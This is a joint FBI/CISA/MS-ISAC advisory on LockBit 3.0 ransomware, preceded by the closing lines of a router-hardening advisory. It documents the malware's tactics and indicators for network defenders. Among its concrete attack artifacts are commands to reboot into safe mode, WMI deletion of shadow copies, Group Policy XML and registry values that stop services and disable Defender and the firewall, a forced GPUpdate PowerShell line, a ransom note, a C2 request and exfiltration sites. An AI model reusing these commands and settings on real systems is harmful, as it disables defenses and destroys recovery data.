Do not use SNMP if you are not required to configure or manage devices remotely to prevent unauthorized users from accessing your router.

If you are required to manage routers remotely, establish allow and deny lists for SNMP messages to prevent unauthorized users from accessing your router.


Do not allow unencrypted (i.e., plaintext) management protocols, such as SNMP v2 and Telnet. Where encrypted protocols aren’t possible, you should carry out any management activities from outside the organization through an encrypted virtual private network (VPN), where both ends are mutually authenticated.
Enforce a strong password policy. Don’t reuse the same password for multiple devices. Each device should have a unique password. Where possible, avoid legacy password-based authentication and implement two-factor authentication based on public-private key.
Disable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c. Where possible, use modern encrypted protocols such as SSH and SNMP v3. Harden the encryption protocols based on current best security practice. The NCSC strongly advises owners and operators to retire and replace legacy devices that can’t be configured to use SNMP v3.
Use logging tools to record commands executed on your network devices, such as TACACS+ and Syslog. Use these logs to immediately highlight suspicious events and keep a record of events to support an investigation if the device’s integrity is ever in question. See NCSC guidance on monitoring and logging.
If you suspect your router has been compromised:

Follow Cisco’s advice for verifying the Cisco IOS image.
Revoke all keys associated with that router. When replacing the router configuration be sure to create new keys rather than pasting from the old configuration.
Replace both the ROMMON and Cisco IOS image with an image that has been sourced directly from the Cisco website, in case third party and internal repositories have been compromised.


NSA’s Network Infrastructure guide provides some best practices for SNMP.
See also the Cisco IOS hardening guide and Cisco’s Jaguar Tooth blog.

This product is provided subject to this Notification and this Privacy & Use policy.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-108
30,"






Actions to take today to mitigate cyber threats from ransomware:




Prioritize remediating known exploited vulnerabilities.
Train users to recognize and report phishing attempts.
Enable and enforce phishing-resistant multifactor authentication.







SUMMARY
Note: this joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing & Analysis Center (MS-ISAC) are releasing this joint CSA to disseminate known LockBit 3.0 ransomware IOCs and TTPs identified through FBI investigations as recently as March 2023.
The LockBit 3.0 ransomware operations function as a Ransomware-as-a-Service (RaaS) model and is a continuation of previous versions of the ransomware, LockBit 2.0, and LockBit. Since January 2020, LockBit has functioned as an affiliate-based ransomware variant; affiliates deploying the LockBit RaaS use many varying TTPs and attack a wide range of businesses and critical infrastructure organizations, which can make effective computer network defense and mitigation challenging.
The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.
Download the PDF version of this report: 


#StopRansomware: Lockbit 3.0
(PDF,       688.70 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK for Enterprise.
CAPABILITIES
LockBit 3.0, also known as “LockBit Black,” is more modular and evasive than its previous versions and shares similarities with Blackmatter and Blackcat ransomware.
LockBit 3.0 is configured upon compilation with many different options that determine the behavior of the ransomware. Upon the actual execution of the ransomware within a victim environment, various arguments can be supplied to further modify the behavior of the ransomware. For example, LockBit 3.0 accepts additional arguments for specific operations in lateral movement and rebooting into Safe Mode (see LockBit Command Line parameters under Indicators of Compromise). If a LockBit affiliate does not have access to passwordless LockBit 3.0 ransomware, then a password argument is mandatory during the execution of the ransomware. LockBit 3.0 affiliates failing to enter the correct password will be unable to execute the ransomware [T1480.001]. The password is a cryptographic key which decodes the LockBit 3.0 executable. By protecting the code in such a manner, LockBit 3.0 hinders malware detection and analysis with the code being unexecutable and unreadable in its encrypted form. Signature-based detections may fail to detect the LockBit 3.0 executable as the executable’s encrypted potion will vary based on the cryptographic key used for encryption while also generating a unique hash. When provided the correct password, LockBit 3.0 will decrypt the main component, continue to decrypt or decompress its code, and execute the ransomware.
LockBit 3.0 will only infect machines that do not have language settings matching a defined exclusion list. However, whether a system language is checked at runtime is determined by a configuration flag originally set at compilation time. Languages on the exclusion list include, but are not limited to, Romanian (Moldova), Arabic (Syria), and Tatar (Russia). If a language from the exclusion list is detected [T1614.001], LockBit 3.0 will stop execution without infecting the system.
INITIAL ACCESS
Affiliates deploying LockBit 3.0 ransomware gain initial access to victim networks via remote desktop protocol (RDP) exploitation [T1133], drive-by compromise [T1189], phishing campaigns [T1566], abuse of valid accounts [T1078], and exploitation of public-facing applications [T1190].
EXECUTION AND INFECTION PROCESS
During the malware routine, if privileges are not sufficient, LockBit 3.0 attempts to escalate to the required privileges [TA0004]. LockBit 3.0 performs functions such as:

Enumerating system information such as hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices [T1082]
Terminating processes and services [T1489]
Launching commands [TA0002]
Enabling automatic logon for persistence and privilege escalation [T1547]
Deleting log files, files in the recycle bin folder, and shadow copies residing on disk [T1485], [T1490]

LockBit 3.0 attempts to spread across a victim network by using a preconfigured list of credentials hardcoded at compilation time or a compromised local account with elevated privileges [T1078]. When compiled, LockBit 3.0 may also enable options for spreading via Group Policy Objects and PsExec using the Server Message Block (SMB) protocol. LockBit 3.0 attempts to encrypt [T1486] data saved to any local or remote device, but skips files associated with core system functions.
After files are encrypted, LockBit 3.0 drops a ransom note with the new filename <Ransomware ID>.README.txt and changes the host’s wallpaper and icons to LockBit 3.0 branding [T1491.001]. If needed, LockBit 3.0 will send encrypted host and bot information to a command and control (C2) server [T1027].
Once completed, LockBit 3.0 may delete itself from the disk [T1070.004] as well as any Group Policy updates that were made, depending on which options were set at compilation time.
EXFILTRATION
LockBit 3.0 affiliates use Stealbit, a custom exfiltration tool used previously with LockBit 2.0 [TA0010]; rclone, an open-source command line cloud storage manager [T1567.002]; and publicly available file sharing services, such as MEGA [T1567.002], to exfiltrate sensitive company data files prior to encryption. While rclone and many publicly available file sharing services are primarily used for legitimate purposes, they can also be used by threat actors to aid in system compromise, network exploration, or data exfiltration. LockBit 3.0 affiliates often use other publicly available file sharing services to exfiltrate data as well [T1567] (see Table 1).

Table 1: Anonymous File Sharing Sites Used to Exfiltrate Data Before System Encryption


File Sharing Site




https://www.premiumize[.]com


https://anonfiles[.]com


https://www.sendspace[.]com


https://fex[.]net


https://transfer[.]sh


https://send.exploit[.]in



LEVERAGING FREEWARE AND OPEN-SOURCE TOOLS
LockBit affiliates have been observed using various freeware and open-source tools during their intrusions. These tools are used for a range of activities such as network reconnaissance, remote access and tunneling, credential dumping, and file exfiltration. Use of PowerShell and Batch scripts are observed across most intrusions, which focus on system discovery, reconnaissance, password/credential hunting, and privilege escalation. Artifacts of professional penetration-testing tools such as Metasploit and Cobalt Strike have also been observed. See Table 2 for a list of legitimate freeware and open-source tools LockBit affiliates have repurposed for ransomware operations:

Table 2: Freeware and Open-Source Tools Used by LockBit 3.0 Affiliates


Tool
Description
MITRE ATT&CK ID




Chocolatey
Command-line package manager for Windows.
T1072


FileZilla
Cross-platform File Transfer Protocol (FTP) application.
T1071.002


Impacket
Collection of Python classes for working with network protocols.
S0357


MEGA Ltd MegaSync
Cloud-based synchronization tool.
T1567.002


Microsoft Sysinternals ProcDump
Generates crash dumps. Commonly used to dump the contents of Local Security Authority Subsystem Service, LSASS.exe.
T1003.001


Microsoft Sysinternals PsExec
Execute a command-line process on a remote machine.
S0029


Mimikatz
Extracts credentials from system.
S0002


Ngrok
Legitimate remote-access tool abused to bypass victim network protections.
S0508


PuTTY Link (Plink)
Can be used to automate Secure Shell (SSH) actions on Windows.
T1572


Rclone
Command-line program to manage cloud storage files
S1040


SoftPerfect Network Scanner
Performs network scans.
T1046


Splashtop
Remote-desktop software.
T1021.001


WinSCP
SSH File Transfer Protocol client for Windows.
T1048



Indicators of Compromise (IOCs)
The IOCs and malware characteristics outlined below were derived from field analysis. The following samples are current as of March 2023.
LockBit 3.0 Black Icon

 


LockBit 3.0 Wallpaper

 


LockBit Command Line Parameters



LockBit Parameters
Description




-del
Self-delete.


-gdel
Remove LockBit 3.0 group policy changes.


-gspd
Spread laterally via group policy.


-pass (32 character value)
(Required) Password used to launch LockBit 3.0.


-path (File or path)
Only encrypts provided file or folder.


-psex
Spread laterally via admin shares.


-safe
Reboot host into Safe Mode.


-wall
Sets LockBit 3.0 Wallpaper and prints out LockBit 3.0 ransom note.



Mutual Exclusion Object (Mutex) Created
When executed, LockBit 3.0 will create the mutex, Global\<MD4 hash of machine GUID>,and check to see if this mutex has already been created to avoid running more than one instance of the ransomware.
UAC Bypass via Elevated COM Interface
LockBit 3.0 is capable of bypassing User Account Control (UAC) to execute code with elevated privileges via elevated Component Object Model (COM) Interface. C:\Windows\System32\dllhost.exe is spawned with high integrity with the command line GUID 3E5FC7F9-9A51-4367-9063-A120244FBEC.
For example, %SYSTEM32%\dllhost.exe/Processid:{3E5FC7F9-9A51-4367-9063- A120244FBEC7}.
Volume Shadow Copy Deletion
LockBit 3.0 uses Windows Management Instrumentation (WMI) to identify and delete Volume Shadow Copies. LockBit 3.0 uses select * from Win32_ShadowCopy to query for Volume Shadow copies, Win32_ShadowCopy.ID to obtain the ID of the shadow copy, and DeleteInstance to delete any shadow copies.
Registry Artifacts

LockBit 3.0 Icon


Registry Key
Value
Data




HKCR\. <Malware Extension>
(Default)
<Malware Extension>


HKCR\<Malware Extension>\DefaultIcon
(Default)
C:\ProgramData\<Mal ware Extension>.ico




LockBit 3.0 Wallpaper


Registry Key
Value
Data




HKCU\Control Panel\Desktop\WallPaper
(Default)
C:\ProgramData\<Mal ware Extension>.bmp




Disable Privacy Settings Experience


Registry Key
Value
Data




SOFTWARE\Policies\Microsoft\Win dows\OOBE
DisablePrivacyE xperience
0




Enable Automatic Logon


Registry Key
Value
Data




SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
AutoAdminLogon
1


 
DefaultUserName
<username>


 
DefaultDomainNa me
<domain name>


 
DefaultPassword
<password>




Disable and Clear Windows Event Logs


Registry Key
Value
Data




HKLM\SOFTWARE\Microsoft\Windows \CurrentVersion\WINEVT\Channels \*
Enabled
0


HKLM\SOFTWARE\Microsoft\Windows \CurrentVersion\WINEVT\Channels \* \ChannelAccess
ChannelAccess
AO:BAG:SYD:(A;;0x1;; ;SY)(A;;0x5;;;BA)(A; ;0x1;;;LA)




Ransom Locations


LockBit 3.0 File Path Locations




ADMIN$\Temp\<LockBit3.0 Filename>.exe


%SystemRoot%\Temp\<LockBit3.0 Filename>.exe


\<Domain Name>\sysvol\<Domain Name>\scripts\<Lockbit 3.0 Filename>.exe (Domain Controller)



Safe Mode Launch Commands
LockBit 3.0 has a Safe Mode feature to circumvent endpoint antivirus and detection. Depending upon the host operating system, the following command is launched to reboot the system to Safe Mode with Networking:



Operating System
Safe Mode with Networking command




Vista and newer
bcdedit /set {current} safeboot network


Pre-Vista
bootcfg /raw /a /safeboot:network /id 1






Operating System
Disable Safe mode reboot




Vista and newer
bcdedit /deletevalue {current} safeboot


Pre-Vista
bootcfg /raw /fastdetect /id 1



Group Policy Artifacts
The following are Group Policy Extensible Markup Language (XML) files identified after a LockBit 3.0 infection:



NetworkShares.xml




<?xml version=""1.0"" encoding=""utf-8""?><NetworkShareSettings clsid=""{520870D8-A6E7-47e8-A8D8-E6A4E76EAEC2}""><NetShare clsid=""{2888C5E7-94FC-4739-90AA-2C1536D68BC0}""image=""2"" name=""%%ComputerName%%_D"" changed=""%s"" uid=""%s""><Properties action=""U"" name=""%%ComputerName%%_D"" path=""D:"" comment="""" allRegular=""0"" allHidden=""0"" allAdminDrive=""0"" limitUsers=""NO_CHANGE"" abe=""NO_CHANGE""/>



Services.xml stops and disables services on the Active Directory (AD) hosts.



Services.xml




<?xml version=""1.0"" encoding=""utf-8""?><NTServices clsid=""{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}""><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""SQLPBDMS"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""SQLPBDMS"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""SQLPBENGINE"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""SQLPBENGINE"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""MSSQLFDLauncher"" image=""4"" changed=""%s"" uid=""%s"" userContext=""0"" removePolicy=""0"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""MSSQLFDLauncher"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""SQLSERVERAGENT"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""SQLSERVERAGENT"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""MSSQLServerOLAPService"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""MSSQLServerOLAPService"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""SSASTELEMETRY"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""SSASTELEMETRY"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""SQLBrowser"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""SQLBrowser"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""SQL Server Distributed Replay Client"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""SQL Server Distributed Replay Client"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""SQL Server Distributed Replay Controller"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""SQL Server Distributed Replay Controller"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""MsDtsServer150"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""MsDtsServer150"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""SSISTELEMETRY150"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""SSISTELEMETRY150"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""SSISScaleOutMaster150"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""SSISScaleOutMaster150"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""SSISScaleOutWorker150"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""SSISScaleOutWorker150"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""MSSQLLaunchpad"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""MSSQLLaunchpad"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""SQLWriter"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""SQLWriter"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""SQLTELEMETRY"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""SQLTELEMETRY"" serviceAction=""STOP"" timeout=""30""/></NTService><NTService clsid=""{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}""name=""MSSQLSERVER"" image=""4"" changed=""%s"" uid=""%s"" disabled=""0""><Properties startupType=""DISABLED"" serviceName=""MSSQLSERVER"" serviceAction=""STOP"" timeout=""60""/></NTService></NTServices>



Registry.pol
The following registry configuration changes values for the Group Policy refresh time, disable SmartScreen, and disable Windows Defender.



Registry Key
Registry Value
Value type
Data




HKLM\SOFTWARE\Policies\Microsoft\Window s\System
GroupPolicyRefresh TimeDC
REG_D WORD
1


HKLM\SOFTWARE\Policies\Microsoft\Window s\System
GroupPolicyRefresh TimeOffsetDC
REG_D WORD
1


HKLM\SOFTWARE\Policies\Microsoft\Window s\System
GroupPolicyRefresh Time
REG_D WORD
1


HKLM\SOFTWARE\Policies\Microsoft\Window s\System
GroupPolicyRefresh TimeOffset
REG_D WORD
1


HKLM\SOFTWARE\Policies\Microsoft\Window s\System
EnableSmartScreen
REG_D WORD
0


HKLM\SOFTWARE\Policies\Microsoft\Window s\System
**del.ShellSmartSc reenLevel
REG_S Z
 


HKLM\SOFTWARE\Policies\Microsoft\Window s Defender
DisableAntiSpyware
REG_D WORD
1


HKLM\SOFTWARE\Policies\Microsoft\Window s Defender
DisableRoutinelyTa kingAction
REG_D WORD
1


HKLM\SOFTWARE\Policies\Microsoft\Window s Defender\Real-Time Protection
DisableRealtimeMon itoring
REG_D WORD
1


HKLM\SOFTWARE\Policies\Microsoft\Window s Defender\Real-Time Protection
DisableBehaviorMon itoring
REG_D WORD
1


HKLM\SOFTWARE\Policies\Microsoft\Window s Defender\Spynet
SubmitSamplesConse nt
REG_D WORD
2


HKLM\SOFTWARE\Policies\Microsoft\Window s Defender\Spynet
SpynetReporting
REG_D WORD
0


HKLM\SOFTWARE\Policies\Microsoft\Window sFirewall\DomainProfile
EnableFirewall
REG_D WORD
0


HKLM\SOFTWARE\Policies\Microsoft\Window sFirewall\StandardProfile
EnableFirewall
REG_D WORD
0



Force GPUpdate
Once new group policies are added, a PowerShell command using Group Policy update (GPUpdate) applies the new group policy changes to all computers on the AD domain.



Force GPUpdate Powershell Command




powershell Get-ADComputer -filter * -Searchbase '%s' | Foreach-Object { Invoke- GPUpdate -computer $_.name -force -RandomDelayInMinutes 0}



Services Killed



vss
sql
svc$


memtas
mepocs
msexchange


sophos
veeam
backup


GxVss
GxBlr
GxFWD


GxCVD
GxCIMgr
 



Processes Killed



sql
oracle
ocssd


dbsnmp
synctime
agntsvc


isqlplussvc
xfssvccon
mydesktopservice


ocautoupds
encsvc
firefox


tbirdconfig
mydesktopqos
ocomm


dbeng50
sqbcoreservice
excel


infopath
msaccess
mspu


onenote
outlook
powerpnt


steam
thebat
thunderbird


visio
winword
wordpad


notepad
 
 



LockBit 3.0 Ransom Note




~~~ LockBit 3.0 the world's fastest and most stable ransomware from 2019~~~
>>>>> Your data is stolen and encrypted.
If you don't pay the ransom, the data will be published on our TOR darknet sites. Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time. The sooner you pay the ransom, the sooner your company will be safe.




Network Connections
If configured, Lockbit 3.0 will send two HTTP POST requests to one of the C2servers. Information about the victim host and bot are encrypted with an Advanced Encryption Standard (AES) key and encoded in Base64.




Example of HTTP POST request
POST <Lockbit C2>/?7F6Da=u5a0TdP0&Aojq=&NtN1W=OuoaovMvrVJSmPNaA5&fckp9=FCYyT6b7kdyeEXywS8I8 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, br Content-Type: text/plain
User-Agent: Safari/537.36 <Lockbit User Agent String>
Host: <Lockbit C2>
Connection: Keep-Alive LIWy=RJ51lB5GM&a4OuN=<Lockbit
ID>&LoSyE3=8SZ1hdlhzld4&DHnd99T=rTx9xGlInO6X0zWW&2D6=Bokz&T1guL=MtRZsFCRMKyBmfmqI& 6SF3g=JPDt9lfJIQ&wQadZP=<Base64 encrypted data> Xni=AboZOXwUw&2rQnM4=94L&0b=ZfKv7c&NO1d=M2kJlyus&AgbDTb=xwSpba&8sr=EndL4n0HVZjxPR& m4ZhTTH=sBVnPY&xZDiygN=cU1pAwKEztU&=5q55aFIAfTVQWTEm&4sXwVWcyhy=l68FrIdBESIvfCkvYl
Example of information found in encrypted data
{
""bot_version"":""X"",
""bot_id"":""X"",
""bot_company"":""X"", ""host_hostname"":""X"", ""host_user"":""X"",
""host_os"":""X"",
""host_domain"":""X"",
""host_arch"":""X"",
""host_lang"":""X"", ""disks_info"":[
{
""disk_name"":""X"",
""disk_size"":""XXXX"", ""free_size"":""XXXXX""
}




User Agent Strings



Mozilla/5.0 (Windows NT6.1)
AppleWebKit/587.38(KHTML, like Gecko)
Chrome/91.0.4472.77


Safari/537.36
Edge/91.0.864.37
Firefox/89.0


Gecko/20100101
 
 



MITRE ATT&CK TECHNIQUES
See Table 3 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping to the MITRE ATT&CK framework, see CISA’s Decider Tool and Best Practices for MITRE ATT&CK Mapping Guide.






Initial Access 








Technique Title 






ID 






Use 










 


Valid Accounts 






 


T1078 






 


LockBit 3.0 actors obtain and abuse credentials of existing accounts as a means of gaining initial access. 








 


Exploit External Remote Services 






 


T1133 






 


LockBit 3.0 actors exploit RDP to gain access to victim networks. 








 


Drive-by Compromise 






 


T1189 






 


LockBit 3.0 actors gain access to a system through a user visiting a website over the normal course of browsing. 








 


Exploit Public-Facing Application 






 


T1190 






 


LockBit 3.0 actors exploit vulnerabilities in internet-facing systems to gain access to victims’ systems. 








 


Phishing 






 


T1566 






 


LockBit 3.0 actors use phishing and spearphishing to gain access to victims' networks. 












Execution 








Technique Title 






ID 






Use 










Execution 






TA0002 






LockBit 3.0 launches commands during its execution. 








Software Deployment Tools 






T1072 






LockBit 3.0 uses Chocolatey, a command- line package manager for Windows. 












Persistence 








Technique Title 






ID 






Use 










Valid Accounts 






T1078 






LockBit 3.0 uses a compromised user account to maintain persistence on the target network. 








Boot or Logo Autostart Execution 






T1547 






LockBit 3.0 enables automatic logon for persistence. 












Privilege Escalation 








Technique Title 






ID 






Use 










Privilege Escalation 






TA0004 






Lockbit 3.0 will attempt to escalate to the required privileges if current account privileges are insufficient. 








Boot or Logo Autostart Execution 






T1547 






LockBit 3.0 enables automatic logon for privilege escalation. 












Defense Evasion 








Technique Title 






ID 






Use 










Obfuscated Files or Information 






T1027 






LockBit 3.0 will send encrypted host and bot information to its C2 servers. 








Indicator Removal: File Deletion 






T1070.004 






LockBit 3.0 will delete itself from the disk. 








Execution Guardrails: Environmental Keying 






T1480.001 






LockBit 3.0 will only decrypt the main component or continue to decrypt and/or decompress data if the correct password is entered. 












Credential Access 








Technique Title 






ID 






Use 










OS Credential Dumping: LSASS Memory 






T1003.001 






LockBit 3.0 uses Microsoft Sysinternals ProDump to dump the contents of LSASS.exe. 












Discovery 








Technique Title 






ID 






Use 










Network Service Discovery 






T1046 






LockBit 3.0 uses SoftPerfect Network Scanner to scan target networks. 








System Information Discovery 






T1082 






LockBit 3.0 will enumerate system information to include hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices. 








System Location Discovery: System Language Discovery 






T1614.001 






LockBit 3.0 will not infect machines with language settings that match a defined exclusion list. 












Lateral Movement 








Technique Title 






ID 






Use 










Remote Services: Remote Desktop Protocol 






T1021.001 






LockBit 3.0 uses Splashtop remote- desktop software to facilitate lateral movement. 












Command and Control 








Technique Title 






ID 






Use 










Application Layer Protocol: File Transfer Protocols 






T1071.002 






LockBit 3.0 uses FileZilla for C2. 








Protocol Tunnel 






T1572 






LockBit 3.0 uses Plink to automate SSH actions on Windows. 












Exfiltration 








Technique Title 






ID 






Use 










Exfiltration 






TA0010 






LockBit 3.0 uses Stealbit, a custom exfiltration tool first used with LockBit 2.0, to steal data from a target network. 








Exfiltration Over Web Service 






T1567 






LockBit 3.0 uses publicly available file sharing services to exfiltrate a target’s data. 








Exfiltration Over Web Service: Exfiltration to Cloud Storage 






T1567.002 






LockBit 3.0 actors use (1) rclone, an open source command line cloud storage manager to exfiltrate and (2) MEGA, a publicly available file sharing service for data exfiltration. 












Impact 








Technique Title 






ID 






Use 










Data Destruction 






T1485 






LockBit 3.0 deletes log files and empties the recycle bin. 








Data Encrypted for Impact 






T1486 






LockBit 3.0 encrypts data on target systems to interrupt availability to system and network resources. 








Service Stop 






T1489 






LockBit 3.0 terminates processes and services. 








Inhibit System Recovery 






T1490 






LockBit 3.0 deletes volume shadow copies residing on disk. 








Defacement: Internal Defacement 






T1491.001 






LockBit 3.0 changes the host system’s wallpaper and icons to the LockBit 3.0 wallpaper and icons, respectively. 






MITIGATIONS
The FBI, CISA, and the MS-ISAC recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of LockBit 3.0’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers [CPG 7.3] in a physically separate, segmented, and secure location (e.g., hard drive, storage device, the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies [CPG 3.4].

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length [CPG 1.4]
Store passwords in hashed format using industry-recognized password managers
Add password user “salts” to shared login credentials
Avoid reusing passwords
Implement multiple failed login attempt account lockouts [CPG 1.1]
Disable password “hints”
Refrain from requiring password changes more frequently than once per year. Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software


Require phishing-resistant multifactor authentication [CPG 1.3] for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats.
Segment networks [CPG 8.1] to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network [CPG 5.1]. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege [CPG 1.5].
Disable unused ports.
Consider adding an email banner to emails [CPG 8.3] received from outside your organization.
Disable hyperlinks in received emails.
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.
Maintain offline backups of data, and regularly maintain backup and restoration [CPG 7.3]. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 3.3].

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the FBI, CISA, and the MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and the MS-ISAC authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.To get started:

Select an ATT&CK technique described in this advisory (see Table 3).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI, CISA, and the MS-ISAC recommend continually testing your security program at scale and in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
The FBI is seeking any information that can be legally shared, including:

Boundary logs showing communication to and from foreign IP addresses
Sample ransom note
Communications with LockBit 3.0 actors
Bitcoin wallet information
Decryptor files
Benign sample of an encrypted file

